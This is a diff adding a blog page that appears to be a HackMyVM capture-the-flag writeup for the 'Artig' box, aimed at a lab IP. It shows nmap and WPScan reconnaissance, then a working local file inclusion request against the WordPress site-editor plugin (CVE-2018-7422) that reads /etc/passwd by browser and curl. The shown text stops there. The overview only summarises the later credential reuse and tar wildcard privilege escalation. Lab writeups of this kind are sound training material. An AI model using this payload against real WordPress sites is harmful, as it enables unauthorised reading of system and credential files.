@@ -1,0 +1,2492 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Artig — HackMyVM &middot; k40t1k</title>
+    <meta name="title" content="Artig — HackMyVM &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="https://k40tik.github.io/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="https://k40tik.github.io/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="https://k40tik.github.io/posts/artig-hackmyvm/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="https://k40tik.github.io/posts/artig-hackmyvm/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Artig — HackMyVM">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-09-10T22:26:00+03:00">
+		<meta property="article:modified_time" content="2026-09-10T22:26:00+03:00">
+		<meta property="article:tag" content="HackMyVM">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Easy">
+		<meta property="article:tag" content="FTP">
+		<meta property="article:tag" content="WordPress">
+		<meta property="article:tag" content="LFI">
+		<meta property="og:image" content="https://k40tik.github.io/posts/artig-hackmyvm/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="https://k40tik.github.io/posts/artig-hackmyvm/feature.png">
+	<meta name="twitter:title" content="Artig — HackMyVM">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Artig — HackMyVM",
+    "headline": "Artig — HackMyVM",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/k40tik.github.io\/posts\/artig-hackmyvm\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-09-10T22:26:00\u002b03:00",
+    "datePublished": "2026-09-10T22:26:00\u002b03:00",
+    
+    "dateModified": "2026-09-10T22:26:00\u002b03:00",
+    
+    "keywords": ["HackMyVM","Linux","Easy","FTP","WordPress","LFI","Redis","SSH","John the Ripper","Tar Wildcard Injection","Privilege Escalation","CVE-2018-7422","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1659"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "https://k40tik.github.io/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Artig — Hack My Vm",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  
+
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Artig — HackMyVM
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-09-10 22:26:00 &#43;0300 EAT">10 September 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/feature_hu_6c89cd4ffe6dcfce.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="555"
+        height="482"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/feature.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a>
+      <ul>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#http">HTTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-2-exploiting-the-site-editor-lfi-cve-2018-7422">Step 2: Exploiting the site-editor LFI (CVE-2018-7422)</a></li>
+    <li><a href="#step-3-ftp-access-as-mario">Step 3: FTP Access as Mario</a></li>
+    <li><a href="#step-4-initial-access--ssh-as-max">Step 4: Initial Access — SSH as max</a></li>
+    <li><a href="#step-5-privilege-escalation">Step 5: Privilege Escalation</a>
+      <ul>
+        <li><a href="#escalating-to-www-data">Escalating to www-data</a></li>
+        <li><a href="#the-wildcard-injection">The Wildcard Injection</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>This writeup covers my path to root on <strong>Artig</strong>, a HackMyVM box that ties together web exploitation and a classic cron-based privilege escalation. The attack chain started with a WordPress install running a vulnerable <code>site-editor</code> plugin, which let me read arbitrary files through a local file inclusion vulnerability (CVE-2018-7422). From the LFI I recovered a Redis configuration file that contained a leaked password in a hidden comment, granting me FTP access as <code>mario</code>. Deeper enumeration of the FTP service exposed WordPress configuration backups with valid credentials, which I reused to land an SSH session as <code>max</code>. A writable cron job running <code>tar</code> with a wildcard allowed a checkpoint-based command injection to set the SUID bit on <code>/bin/bash</code> and complete the compromise.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>I started with a full port scan against the target (192.168.56.114) to map the surface.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 192.168.56.114
+</code></pre><pre tabindex="0"><code>PORT     STATE SERVICE REASON         VERSION
+21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000          649 Apr 10 19:39 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.56.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
+80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.66 ((Debian))
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Hello World!
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: WordPress 6.9.4
+6379/tcp open  redis   syn-ack ttl 64 Redis key-value store
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>FTP (21) allows anonymous login and exposes a file called <code>note.txt</code>.</li>
+<li>SSH (22) accepts password authentication.</li>
+<li>HTTP (80) is running WordPress 6.9.4.</li>
+<li>Redis (6379) is exposed and open to the network.</li>
+</ul>
+<h3 id="ftp" class="relative group">FTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ftp" aria-label="Anchor">#</a></span></h3><p>Anonymous FTP access was allowed, so I logged in and took a look.</p>
+<pre tabindex="0"><code>ftp anonymous@192.168.56.114
+</code></pre><p>I found a single file inside: <code>note.txt</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-anon-note_hu_8ec4da3b64176f2f.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="586"
+        height="116"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-anon-note.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The note was left behind by <strong>mike</strong>, the new sysadmin. It mentions potential issues with running services and their configuration files, which pointed me toward the config files of the exposed services.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_88b86e320f724351.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_8605efd7390c41c1.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_50024f22255f62a0.webp 965w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_50024f22255f62a0.webp 965w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="965"
+        height="207"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_30324107744bb116.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_819949ff9cb5e598.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content_hu_30324107744bb116.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content.png 965w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ftp-note-content.png 965w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="ssh" class="relative group">SSH <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssh" aria-label="Anchor">#</a></span></h3><p>Checking the SSH banner, I confirmed that password authentication is enabled, which meant password-based logins were going to be the way in later.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_9bf0fb7b763454b6.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_39a59cb9b483a4c2.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_f297256061f80ce1.webp 713w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_f297256061f80ce1.webp 713w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="713"
+        height="116"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_13038739b21e0bf.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_fd432677aa6f98fa.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth_hu_13038739b21e0bf.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth.png 713w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/ssh-password-auth.png 713w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="http" class="relative group">HTTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http" aria-label="Anchor">#</a></span></h3><p>The web server loads a plain &ldquo;Hello World!&rdquo; test page, but the generator tag gave away that WordPress 6.9.4 is running underneath.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_51db1154256ea21d.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_2017acb6c216c6a2.webp 660w
+            
+              ,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_ff5d02a0f3da7db5.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_cbfe2cd1ed17c0a0.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1788"
+        height="997"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_90aca420faeae708.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_cd7ae1cd2b9d49dc.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_90aca420faeae708.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_7160ac5f6a297cfc.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wordpress-landing_hu_bdefab040d3ae086.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I ran <strong>WPScan</strong> against the site to see if any vulnerable plugins were in play.</p>
+<pre tabindex="0"><code>wpscan --url http://192.168.56.114
+</code></pre><pre tabindex="0"><code>Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.66 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.56.114/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://192.168.56.114/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.56.114/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.56.114/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+
+[+] WordPress version 6.9.4 identified (Insecure, released on 2026-03-11).
+ | Found By: Meta Generator (Passive Detection)
+
+[+] WordPress theme in use: twentytwentyfive
+ | Version: 1.4 (80% confidence)
+ | Found By: Style (Passive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[+] Finished: Tue Sep  8 16:54:57 2026
+[+] Requests Done: 47
+[+] Cached Requests: 5
+</code></pre><p>The default scan didn&rsquo;t return any vulnerable plugin data, so I supplied a WPScan API token and rescanned. This identified two plugins: <code>wp-file-manager</code> and <code>site-editor</code>.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_83a855edb0fbdba1.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_989e4db1c430eb31.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_f3b04c18fafa9d30.webp 671w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_f3b04c18fafa9d30.webp 671w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="671"
+        height="153"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_b14aeb96fd711abf.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_c6d1c4cc13c4c2d3.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins_hu_b14aeb96fd711abf.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins.png 671w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/wpscan-plugins.png 671w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The <code>site-editor</code> plugin jumped out at me because it was also mentioned in the note left by the new sysadmin — and it has a public CVE.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_88b3449cdeca25e0.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_15acd9a66d00fc61.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_2d93b7bff6d610ea.webp 691w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_2d93b7bff6d610ea.webp 691w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="691"
+        height="165"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_e044c837f7a4661e.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_b8fb3d547aa067b5.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve_hu_e044c837f7a4661e.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve.png 691w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve.png 691w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The plugin ships with an unauthenticated local file inclusion flaw.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_829daf4d5646f59d.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_542eac9ed5a1556e.webp 660w
+            
+              ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_ee208d162a935cb5.webp 1024w
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_18a89a70d8f26de7.webp 1234w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1234"
+        height="484"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_1123b00dc28ac826.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_9ea3a1130baf7911.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_1123b00dc28ac826.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2_hu_8023aed275a9793.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/site-editor-cve-2.png 1234w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-2-exploiting-the-site-editor-lfi-cve-2018-7422" class="relative group">Step 2: Exploiting the site-editor LFI (CVE-2018-7422) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-exploiting-the-site-editor-lfi-cve-2018-7422" aria-label="Anchor">#</a></span></h2><p>The affected endpoint is <code>ajax_shortcode_pattern.php</code>, which takes an <code>ajax_path</code> parameter and reads whatever file path I pass it. I made the request with the path appended at the end.</p>
+<pre tabindex="0"><code>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=
+</code></pre><p>As a proof of concept I pulled <code>/etc/passwd</code>.</p>
+<pre tabindex="0"><code>http://192.168.56.114/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_bb18dd73ae19474a.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_263b0b1fb8702df5.webp 660w
+            
+              ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_b6144fcd5550c8cb.webp 1024w
+            
+            
+              ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_68aaa0ef08ab879d.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1402"
+        height="281"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_8c05e15713e9f494.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_dc3652b7e17255bd.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_8c05e15713e9f494.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_b1dcbc387a9a4d44.png 1024w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-passwd_hu_9f755fc13b008bd3.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The same request works over <code>curl</code>, which is cleaner for scripting.</p>
+<pre tabindex="0"><code>curl &#39;http://192.168.56.114/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_f252a78caf07c0ce.webp 330w,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_d1cb1535cc609038.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_918c6df0c8dd3277.webp 695w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_918c6df0c8dd3277.webp 695w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="695"
+        height="528"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_72ff4a1751451f0a.png" srcset="https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_c01c5da0a7c85216.png 330w,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd_hu_72ff4a1751451f0a.png 660w
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd.png 695w
+          
+          
+            ,https://k40tik.github.io/posts/artig-hackmyvm/lfi-curl-passwd.png 695w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
